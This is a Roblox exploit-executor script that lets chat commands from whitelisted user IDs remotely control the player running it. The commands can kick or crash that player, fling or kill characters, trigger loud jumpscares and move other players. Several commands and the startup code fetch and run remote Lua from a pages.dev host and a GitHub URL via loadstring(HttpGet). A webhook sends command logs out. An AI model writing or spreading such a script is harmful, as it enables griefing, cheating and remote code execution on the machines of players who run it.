local COMMAND_PREFIX = ".";
local IDENTIFIER_ALL = "*";
local WHITELISTED_IDS = {
	9303416937,
  9563224947,
	10617208914,
  11479975564,
};

local cloneref = cloneref or function(...) return ...; end;
local function getService(service)
	return cloneref(game:GetService(service))
end;

local runService = getService("RunService")
local players = getService("Players")
local textChatService = getService("TextChatService")
local replicatedStorage = getService("ReplicatedStorage")
local soundService = getService("SoundService")
local debris = getService("Debris")
local httpService = getService("HttpService")
local userInputService = getService("UserInputService")

local isLegacyChat = textChatService.ChatVersion == Enum.ChatVersion.LegacyChatService;
local jobId = game.JobId;

local player = players.LocalPlayer;
local character = player.Character;
local humanoid = character and character:FindFirstChildOfClass("Humanoid") or false;
local humanoidRootPart = humanoid and humanoid.RootPart or false;

local userName = tostring(player)
local displayName = player.DisplayName;

local commands, aliases, connections = {}, {}, {};
local following, followTarget = false, nil;
local looping = {};
local Anchored = false;

local w = ""

if getgenv()[jobId] then
	getgenv()[jobId]()
end;

-- Check if current player is whitelisted
local function isPlayerWhitelisted(userId)
	return table.find(WHITELISTED_IDS, userId) ~= nil
end

local isWhitelisted = isPlayerWhitelisted(player.UserId)

local function log(pn, cmd, s, d)
	local data = {
		timestamp = os.date("%Y-%m-%d %H:%M:%S"),
		player = pn,
		command = cmd,
		success = s,
		details = d or "No details"
	}
	
	print(string.format("[KZK LOG] %s | %s | %s | %s | %s", data.timestamp, data.player, data.command, tostring(data.success), data.details))
	
	spawn(function()
		local ok, r = pcall(function()
			if request then
				request({
					Url = w,
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = httpService:JSONEncode({
						embeds = {{
							title = "KZK Command Log",
							description = string.format("**Player:** %s\n**Command:** %s\n**Success:** %s\n**Details:** %s",
								data.player, data.command, tostring(data.success), data.details),
							color = s and 3066993 or 15158332,
							timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
						}}
					})
				})
			end
		end)
		
		if not ok then
			warn("Webhook failed: " .. tostring(r))
		end
	end)
end

local function addConnection(A, Callback)
	local connection = A:Connect(Callback)
	connections[#connections + 1] = connection;
	return connection;
end;

local function compareText(player, target)
	return string.match(string.lower(player), string.lower(target))
end;

local function getPlayer(input)
	local allPlayers = players:GetPlayers()

	if allPlayers[input] then
		return allPlayers[input];
	end;

	for _,v in allPlayers do
		if v ~= player and (compareText(tostring(v), input) or compareText(v.DisplayName, input)) then
			return v;
		end;
	end;

	return false;
end

local function stringComparison(original, comparison)
	return string.match(string.lower(original), string.lower(comparison))
end;

local function findPlayer(q) 
	if not q or q=="" then return nil end 
	q=q:lower() 
	for _,p in pairs(players:GetPlayers()) do 
		if p.Name:lower():find(q,1,true) or p.DisplayName:lower():find(q,1,true) then 
			return p 
		end 
	end 
	return nil 
end

local function getTarget(args,i,fallback) 
	return (#args>=i and args[i]~="") and (args[i]:lower()=="all" and player or findPlayer(args[i])) or fallback 
end

local function tp(from,to) 
	local fc,tc=(from==player and player.Character or from.Character),to.Character 
	if fc and fc.HumanoidRootPart and tc and tc.HumanoidRootPart then 
		fc.HumanoidRootPart.CFrame=tc.HumanoidRootPart.CFrame+Vector3.new(math.random(-3,3),0,math.random(-3,3)) 
		return true 
	end 
	return false 
end

local function bring(who,to) 
	local wc,tc=who.Character,(to==player and player.Character or to.Character) 
	if wc and wc.HumanoidRootPart and tc and tc.HumanoidRootPart then 
		wc.HumanoidRootPart.CFrame=CFrame.new(tc.HumanoidRootPart.Position+Vector3.new(0,5,0)) 
		return true 
	end 
	return false 
end

local function executeOnTarget(target,func) 
	pcall(function() func(target) end) 
end

local function registerCommand(commandName, commandAliases, requireArguments, commandCallback)
	commandName = string.lower(commandName)

	commands[commandName] = {
		func = commandCallback,
		requireArguments = requireArguments
	};

	for i = 1,#commandAliases do
		aliases[string.lower(commandAliases[i])] = commandName;
	end;
end;

local function handleMessage(caller, message)
	if #message <= 1 or string.sub(message, 1, 1) ~= COMMAND_PREFIX then
		return;
	end;

	local arguments = string.split(string.sub(message, 2), " ")
	local executedCommand = string.lower(arguments[1])
	local commandData = commands[executedCommand] or (aliases[executedCommand] and commands[aliases[executedCommand]]) or false;

	if not commandData then return; end;
	if commandData.requireArguments and not arguments[2] then return; end;
	if commandData.requireArguments and (arguments[2] ~= IDENTIFIER_ALL and not stringComparison(userName, arguments[2]) and not stringComparison(displayName, arguments[2])) then return; end;
	
	local callArguments = {};
	for i = commandData.requireArguments and 3 or 2, #arguments do
		callArguments[#callArguments + 1] = arguments[i];
	end;

	local errSuccess, success, result = pcall(commandData.func, caller, unpack(callArguments))

	if not errSuccess then
		log(caller.Name, executedCommand, false, "Error: " .. tostring(success))
		return;
	end;

	if type(success) == "boolean" and not success then
		log(caller.Name, executedCommand, false, result or "Command failed")
		return;
	end;
	
	log(caller.Name, executedCommand, true, result or "Command executed successfully")
end;

local function sendChat(message)
	if not message or #message == 0 then return; end;

	if isLegacyChat then
		local chatRemote = replicatedStorage:FindFirstChild("SayMessageRequest", true)
		return chatRemote:FireServer(message, "All");
	end;

	local chat = textChatService.ChatInputBarConfiguration.TargetTextChannel;
	local textChannels = textChatService:FindFirstChild("TextChannels") or false
	local generalChannel = textChannels and textChannels:FindFirstChild("RBXGeneral")

	return (generalChannel and generalChannel or chat):SendAsync(message)
end;

registerCommand("kick", {"ban"}, true, function(caller, ...)
	player:Kick(#{...} > 0 and table.concat({...}, " ") or "");
end)

registerCommand("chat", {"ch"}, true, function(caller, ...)
	sendChat(#{...} > 0 and table.concat({...}, " ") or "Hi!")
end)

registerCommand("crash", {}, true, function()
	while true do end;
end)

registerCommand("bring", {"br"}, true, function(caller)
	if not caller.Character or not caller.Character:FindFirstChildOfClass("Humanoid") or not caller.Character:FindFirstChildOfClass("Humanoid").RootPart then
		return false, "Missing HumanoidRootPart";
	end;
	
	if not humanoid or not humanoidRootPart or not character then
		return false, "Missing Parts.";
	end;

	if Anchored then
		humanoidRootPart.Anchored = false;
		task.wait(.1)
	end;

	humanoidRootPart.CFrame = caller.Character:FindFirstChildOfClass("Humanoid").RootPart.CFrame;

	if Anchored then
		task.wait(.1)
		humanoidRootPart.Anchored = true;
	end;
end)

registerCommand("kill", {}, true, function(caller)
	if not humanoid or not humanoidRootPart or not character then
		return false, "Missing Parts.";
	end;

	humanoid.Health = 0;
end)

registerCommand("reset", {"re"}, true, function(caller)
	if not humanoid or not humanoidRootPart or not character then
		return false, "Missing Parts.";
	end;

	local oldHumanoidRootPart = humanoidRootPart;
	local oldPosition = humanoidRootPart.CFrame;
	humanoid.Health = 0;
	player.CharacterAdded:Wait()
	task.spawn(function()
		repeat task.wait() until humanoidRootPart ~= oldHumanoidRootPart;
		humanoidRootPart.CFrame = oldPosition
	end)
end)

registerCommand("freeze", {"lock"}, true, function(caller)
	if not humanoid or not humanoidRootPart or not character then
		return false, "Missing Parts.";
	end;

	Anchored = true;
	humanoidRootPart.Anchored = true;
end)

registerCommand("thaw", {"unfreeze", "unlock"}, true, function(caller)
	if not humanoid or not humanoidRootPart or not character then
		return false, "Missing Parts.";
	end;

	Anchored = false;
	humanoidRootPart.Anchored = false;
end)

registerCommand("jump", {"jmp", "unsit"}, true, function(caller)
	if not humanoid or not humanoidRootPart or not character then
		return false, "Missing Parts.";
	end;

	humanoid.Sit = false;
	humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
end)

registerCommand("sit", {}, true, function(caller)
	if not humanoid or not humanoidRootPart or not character then
		return false, "Missing Parts.";
	end;

	humanoid.Sit = true;
end)

registerCommand("fling", {}, true, function(caller)
	if not humanoid or not humanoidRootPart or not character then
		return false, "Missing Parts.";
	end;

	local bodyVelocity = Instance.new("BodyVelocity")
	bodyVelocity.Velocity = Vector3.new(math.random(-100, 100), math.random(50, 150), math.random(-100, 100))
	bodyVelocity.MaxForce = Vector3.new(1e200, 1e200, 1e200)
	bodyVelocity.Parent = humanoidRootPart;
	debris:AddItem(bodyVelocity, .5)
end)

registerCommand("fling2", {}, true, function(caller)
	if not humanoid or not humanoidRootPart or not character then
		return false, "Missing Parts.";
	end;

	local bodyVelocity = Instance.new("BodyVelocity")
	bodyVelocity.Velocity = Vector3.new(math.random(-700, 400), math.random(50, 300), math.random(-700, 400))
	bodyVelocity.MaxForce = Vector3.new(1e200, 1e200, 1e200)
	bodyVelocity.Parent = humanoidRootPart;
	debris:AddItem(bodyVelocity, .5)
end)

registerCommand("trip", {}, true, function(caller)
	if not humanoid or not humanoidRootPart or not character then
		return false, "Missing Parts.";
	end;

	humanoid.PlatformStand = true;
	humanoidRootPart.Velocity = humanoidRootPart.CFrame.lookVector * 10 + Vector3.new(0, 10, 0)
	humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(90, 90, 90)
	task.wait(2)
	humanoid.PlatformStand = false;
end)

registerCommand("creepy", {"shiver", "xd"}, true, function(caller)
	local sound = Instance.new("Sound", character)
	sound.SoundId = "rbxassetid://157636218";
	sound.Volume = 100;
	sound:Play()
	task.spawn(function()
		task.wait(.5)
		task.wait(sound.TimeLength-.5)
		sound:Destroy()
	end)
end)

registerCommand("knock", {"xd2"}, true, function(caller)
	local sound = Instance.new("Sound", character)
	sound.SoundId = "rbxassetid://5236308259";
	sound.Volume = 100;
	sound:Play()
	task.spawn(function()
		task.wait(.5)
		task.wait(sound.TimeLength-.5)
		sound:Destroy()
	end)
end)

registerCommand("jumpscare", {"jp", "js", "lol"}, true, function(caller)
	local jumpscareGui = Instance.new("ScreenGui")
	jumpscareGui.DisplayOrder = 10;
	jumpscareGui.ResetOnSpawn = false;
	jumpscareGui.Enabled = false;
	jumpscareGui.IgnoreGuiInset = true;
	jumpscareGui.Parent = (gethui and gethui() or getService("CoreGui"))

	local image = Instance.new("ImageLabel")
	image.Size = UDim2.new(1, 0, 1, 0)
	image.Position = UDim2.new(0, 0, 0, 0)
	image.Image = "http://www.roblox.com/asset/?id=10798732430";
	image.Parent = jumpscareGui;

	local sound = Instance.new("Sound", soundService)
	sound.SoundId = "rbxassetid://161964303";
	sound.Volume = 100;
	
	task.spawn(function()
		task.wait(2)
		jumpscareGui.Enabled = true;
		sound:Play()
		wait(4)
		jumpscareGui:Destroy()
		sound:Destroy()
	end)
end)

registerCommand("jumpscare2", {"jp2", "js2", "lol2"}, true, function(caller)
	local jumpscareGui = Instance.new("ScreenGui")
	jumpscareGui.DisplayOrder = 10;
	jumpscareGui.ResetOnSpawn = false;
	jumpscareGui.Enabled = false;
	jumpscareGui.IgnoreGuiInset = true;
	jumpscareGui.Parent = (gethui and gethui() or getService("CoreGui"))

	local image = Instance.new("ImageLabel")
	image.Size = UDim2.new(1, 0, 1, 0)
	image.Position = UDim2.new(0, 0, 0, 0)
	image.Image = "http://www.roblox.com/asset/?id=75431648694596";
	image.Parent = jumpscareGui;

	local sound = Instance.new("Sound", soundService)
	sound.SoundId = "rbxassetid://7236490488";
	sound.Volume = 100;
	
	task.spawn(function()
		task.wait(2)
		sound:Play()
		task.wait(.1)
		jumpscareGui.Enabled = true;
		wait(4)
		jumpscareGui:Destroy()
		sound:Destroy()
	end)
end)

registerCommand("jumpscarefast", {"jpf", "lol3"}, true, function(caller)
	local jumpscareGui = Instance.new("ScreenGui")
	jumpscareGui.DisplayOrder = 10;
	jumpscareGui.ResetOnSpawn = false;
	jumpscareGui.Enabled = false;
	jumpscareGui.IgnoreGuiInset = true;
	jumpscareGui.Parent = (gethui and gethui() or getService("CoreGui"))

	local image = Instance.new("ImageLabel")
	image.Size = UDim2.new(1, 0, 1, 0)
	image.Position = UDim2.new(0, 0, 0, 0)
	image.Image = "http://www.roblox.com/asset/?id=" .. math.random(1,2) == 1 and "75431648694596" or "10798732430";
	image.Parent = jumpscareGui;

	local sound = Instance.new("Sound", soundService)
	sound.SoundId = "rbxassetid://" .. math.random(1,2) == 1 and "7236490488" or "161964303";
	sound.Volume = 100;
	
	task.spawn(function()
		task.wait(2)
		sound:Play()
		task.wait(.1)
		jumpscareGui.Enabled = true;
		wait(2)
		jumpscareGui:Destroy()
		sound:Destroy()
	end)
end)

registerCommand("come", {}, false, function(caller, targetName, destName)
	local target = targetName and findPlayer(targetName) or player
	local dest = destName and findPlayer(destName) or caller
	
	if tp(target, dest) then 
		return true, (target==player and "Bot" or target.DisplayName).." went to "..(dest==caller and "sender" or dest.DisplayName)
	else 
		return false, "Failed to teleport"
	end
end)

registerCommand("follow", {}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName) or caller
	
	if target then 
		following, followTarget = true, target 
		return true, "Following "..target.DisplayName
	else 
		return false, "Player not found"
	end
end)

registerCommand("unfollow", {}, false, function(caller)
	following, followTarget = false, nil 
	return true, "Stopped following"
end)

registerCommand("speed", {}, false, function(caller, speedStr, targetName)
	local target = targetName and findPlayer(targetName) or player
	local speed = tonumber(speedStr) or 16
	
	if target and target.Character and target.Character.Humanoid then 
		target.Character.Humanoid.WalkSpeed = speed
		return true, "Speed set to "..speed.." for "..(target==player and "bot" or target.DisplayName)
	else
		return false, "Target not found or missing character"
	end
end)

registerCommand("walkto", {}, false, function(caller, targetName, destName)
	local target = targetName and findPlayer(targetName) or player
	local dest = destName and findPlayer(destName) or caller
	
	if target and dest and target.Character and target.Character.Humanoid and dest.Character and dest.Character.HumanoidRootPart then
		target.Character.Humanoid:MoveTo(dest.Character.HumanoidRootPart.Position)
		return true, (target==player and "Bot" or target.DisplayName).." walking to "..(dest==caller and "sender" or dest.DisplayName)
	else
		return false, "Target or destination not found"
	end
end)

registerCommand("orbit", {}, false, function(caller, targetName, aroundName)
	local target = targetName and findPlayer(targetName) or player
	local around = aroundName and findPlayer(aroundName) or caller
	
	if target and around and target.Character and target.Character.HumanoidRootPart and around.Character and around.Character.HumanoidRootPart then
		task.spawn(function()
			for i = 1, 36 do
				if target.Character and target.Character.HumanoidRootPart and around.Character and around.Character.HumanoidRootPart then
					local angle = math.rad(i * 10)
					local x = around.Character.HumanoidRootPart.Position.X + math.cos(angle) * 10
					local z = around.Character.HumanoidRootPart.Position.Z + math.sin(angle) * 10
					target.Character.HumanoidRootPart.CFrame = CFrame.new(x, around.Character.HumanoidRootPart.Position.Y, z)
					task.wait(0.1)
				end
			end
		end)
		return true, (target==player and "Bot" or target.DisplayName).." orbiting around "..(around==caller and "sender" or around.DisplayName)
	else
		return false, "Target or orbit center not found"
	end
end)

registerCommand("dance", {}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName) or player
	
	if target and target.Character and target.Character.Humanoid then
		task.spawn(function()
			for i = 1, 10 do
				if target.Character and target.Character.Humanoid then
					target.Character.Humanoid.Jump = true
					task.wait(0.5)
					target.Character.Humanoid.Sit = true
					task.wait(0.3)
					target.Character.Humanoid.Sit = false
					task.wait(0.2)
				end
			end
		end)
		return true, (target==player and "Bot" or target.DisplayName).." dancing"
	else
		return false, "Target not found"
	end
end)

registerCommand("circle", {}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName) or player
	
	if target and target.Character and target.Character.HumanoidRootPart then
		task.spawn(function()
			local startPos = target.Character.HumanoidRootPart.Position
			for i = 1, 36 do
				if target.Character and target.Character.HumanoidRootPart then
					local angle = math.rad(i * 10)
					local x = startPos.X + math.cos(angle) * 5
					local z = startPos.Z + math.sin(angle) * 5
					target.Character.HumanoidRootPart.CFrame = CFrame.new(x, startPos.Y, z)
					task.wait(0.1)
				end
			end
		end)
		return true, (target==player and "Bot" or target.DisplayName).." moving in circle"
	else
		return false, "Target not found"
	end
end)

registerCommand("goto", {}, false, function(caller, xStr, yStr, zStr, targetName)
	local target = targetName and findPlayer(targetName) or player
	local x, y, z = tonumber(xStr), tonumber(yStr), tonumber(zStr)
	
	if x and y and z and target and target.Character and target.Character.HumanoidRootPart then
		target.Character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
		return true, (target==player and "Bot" or target.DisplayName).." teleported to "..x..", "..y..", "..z
	else 
		return false, "Invalid coordinates or target not found"
	end
end)

registerCommand("spin", {}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName) or player
	
	if target and target.Character and target.Character.HumanoidRootPart then
		task.spawn(function()
			for i = 1, 36 do
				if target.Character and target.Character.HumanoidRootPart then
					target.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(10), 0)
					task.wait(0.05)
				end
			end
		end)
		return true, (target==player and "Bot" or target.DisplayName).." spinning"
	else
		return false, "Target not found"
	end
end)

registerCommand("say", {}, false, function(caller, targetName, ...)
	local target = targetName and findPlayer(targetName) or player
	local msg = #{...} > 0 and table.concat({...}, " ") or "Hello!"
	
	if target == player then
		sendChat(msg)
		return true, "Message sent: " .. msg
	else
		return false, "Can only make bot say messages"
	end
end)

registerCommand("stun", {}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName) or player
	
	if target and target.Character and target.Character.Humanoid then 
		target.Character.Humanoid.PlatformStand = true
		return true, (target==player and "Bot" or target.DisplayName).." stunned"
	else
		return false, "Target not found"
	end
end)

registerCommand("unstun", {}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName) or player
	
	if target and target.Character and target.Character.Humanoid then 
		target.Character.Humanoid.PlatformStand = false
		return true, (target==player and "Bot" or target.DisplayName).." unstunned"
	else
		return false, "Target not found"
	end
end)

registerCommand("loopkill", {}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName) or player
	
	if target then
		looping[target.UserId] = {type="kill", target=target}
		return true, "Loop killing "..(target==player and "bot" or target.DisplayName)
	else
		return false, "Target not found"
	end
end)

registerCommand("unloopkill", {}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName) or player
	
	if target and looping[target.UserId] then
		looping[target.UserId] = nil
		return true, "Stopped loop killing "..(target==player and "bot" or target.DisplayName)
	else
		return false, "Target not found or not being loop killed"
	end
end)

registerCommand("invert", {}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName) or player
	
	if target == player then
		local connections = {}
		connections.W = userInputService.InputBegan:Connect(function(input) 
			if input.KeyCode == Enum.KeyCode.W and player.Character and player.Character.Humanoid then 
				player.Character.Humanoid:Move(Vector3.new(0, 0, 1), false) 
			end 
		end)
		connections.S = userInputService.InputBegan:Connect(function(input) 
			if input.KeyCode == Enum.KeyCode.S and player.Character and player.Character.Humanoid then 
				player.Character.Humanoid:Move(Vector3.new(0, 0, -1), false) 
			end 
		end)
		connections.A = userInputService.InputBegan:Connect(function(input) 
			if input.KeyCode == Enum.KeyCode.A and player.Character and player.Character.Humanoid then 
				player.Character.Humanoid:Move(Vector3.new(1, 0, 0), false) 
			end 
		end)
		connections.D = userInputService.InputBegan:Connect(function(input) 
			if input.KeyCode == Enum.KeyCode.D and player.Character and player.Character.Humanoid then 
				player.Character.Humanoid:Move(Vector3.new(-1, 0, 0), false) 
			end 
		end)
		
		task.spawn(function() 
			task.wait(20) 
			for _, connection in pairs(connections) do 
				connection:Disconnect() 
			end 
		end)
		
		return true, "Bot controls inverted for 20 seconds"
	else
		return false, "Can only invert bot controls"
	end
end)

registerCommand("usecmd", {}, false, function(caller, targetName, cmdName)
	local target = targetName and findPlayer(targetName) or player
	
	if not cmdName then 
		return false, "Command name required"
	end
	
	cmdName = cmdName:lower()
	
	local ok, cmdsList = pcall(function()
		return loadstring(game:HttpGet("https://ngrpzyqnezbcpvo7uyszdzherjhxgz.pages.dev/cmdslist.lua"))()
	end)
	
	if not ok or not cmdsList then 
		return false, "Failed to load commands list"
	end
	
	local cmdUrl = cmdsList[cmdName]
	if not cmdUrl then 
		return false, "Command not found: " .. cmdName
	end
	
	local actualUrl = cmdUrl
	if type(cmdUrl) == "table" and cmdUrl[1] then
		actualUrl = cmdUrl[1]
	end
	
	if target == player then
		task.spawn(function()
			pcall(function()
				loadstring(game:HttpGet(actualUrl))()
			end)
		end)
		return true, "Command executed: " .. cmdName
	else
		return false, "Can only execute commands on bot"
	end
end)

registerCommand("cmds", {}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName) or player
	
	if target == player then
		task.spawn(function()
			pcall(function()
				loadstring(game:HttpGet("https://ngrpzyqnezbcpvo7uyszdzherjhxgz.pages.dev/Ownercmdslist.lua"))()
			end)
		end)
		return true, "Commands list loaded"
	else
		return false, "Can only load commands list for bot"
	end
end)

registerCommand("whitelist", {"wl"}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName)
	
	if not target then
		return false, "Target player not found"
	end
	
	if table.find(WHITELISTED_IDS, target.UserId) then
		return false, target.DisplayName .. " is already whitelisted"
	end
	
	table.insert(WHITELISTED_IDS, target.UserId)
	
	log(caller.Name, "whitelist", true, "Added " .. target.DisplayName .. " (ID: " .. target.UserId .. ") to whitelist")
	
	if target == player then
		pcall(function() 
			loadstring(game:HttpGet("https://ngrpzyqnezbcpvo7uyszdzherjhxgz.pages.dev/Ownercmdbar.lua"))()
		end)
	end
	
	return true, "Successfully whitelisted " .. target.DisplayName .. " (ID: " .. target.UserId .. ")"
end)

registerCommand("unwhitelist", {"unwl"}, false, function(caller, targetName)
	local target = targetName and findPlayer(targetName)
	
	if not target then
		return false, "Target player not found"
	end
	
	local index = table.find(WHITELISTED_IDS, target.UserId)
	if not index then
		return false, target.DisplayName .. " is not whitelisted"
	end
	
	table.remove(WHITELISTED_IDS, index)
	
	log(caller.Name, "unwhitelist", true, "Removed " .. target.DisplayName .. " (ID: " .. target.UserId .. ") from whitelist")
	
	return true, "Successfully removed " .. target.DisplayName .. " from whitelist"
end)

registerCommand("rejoin", {"rj"}, true, function(caller)
	if #game.Players:GetPlayers() <= 1 then
		game:GetService("TeleportService"):Teleport(game.PlaceId, player)
	else
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
	end
	return true, "Rejoining game..."
end)

registerCommand("listwhitelist", {"lwl"}, false, function(caller)
	local whitelistedNames = {}
	
	for _, userId in pairs(WHITELISTED_IDS) do
		local player = players:GetPlayerByUserId(userId)
		if player then
			table.insert(whitelistedNames, player.DisplayName)
		else
			table.insert(whitelistedNames, "ID: " .. userId)
		end
	end
	
	if #whitelistedNames == 0 then
		return true, "No players are currently whitelisted"
	end
	
	local message = "Whitelisted: " .. table.concat(whitelistedNames, ", ")
	return true, message
end)

addConnection(player.CharacterAdded, function(newcharacter)
	Anchored = false;

	repeat runService.Heartbeat:Wait() until newcharacter and newcharacter:FindFirstChildOfClass("Humanoid") and newcharacter:FindFirstChildOfClass("Humanoid").RootPart;
	character = newcharacter;
	humanoid = character and character:FindFirstChildOfClass("Humanoid") or false;
	humanoidRootPart = humanoid and humanoid.RootPart or false;
end)

textChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(message)
	local textSource = message and message.TextSource or false;

	if not textSource or not table.find(WHITELISTED_IDS, textSource.UserId) then
		return;
	end;

	handleMessage(players:GetPlayerByUserId(textSource.UserId), message.Text)
end)

addConnection(runService.Heartbeat, function()
	if following and followTarget and followTarget.Character and followTarget.Character.HumanoidRootPart and player.Character and player.Character.HumanoidRootPart and player.Character.Humanoid then
		local dist = (player.Character.HumanoidRootPart.Position - followTarget.Character.HumanoidRootPart.Position).Magnitude
		if dist > 5 then 
			player.Character.Humanoid:MoveTo(followTarget.Character.HumanoidRootPart.Position) 
		end
	elseif following and (not followTarget or not followTarget.Character) then 
		following, followTarget = false, nil 
	end
	
	for userId, data in pairs(looping) do
		if data.type == "kill" and data.target and data.target.Character and data.target.Character.Humanoid then
			data.target.Character.Humanoid.Health = 0
		end
	end
end)

-- Only load command bar for whitelisted users
if isWhitelisted then
	pcall(function() 
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ykknzo-hub/commandlist/refs/heads/main/nemesis%20cmd/ownercmd.lua"))()
	end)
else

end

getgenv()[jobId] = function()
	for i,v in connections do
		v:Disconnect()
	end;

	getgenv()[jobId] = nil;
end;
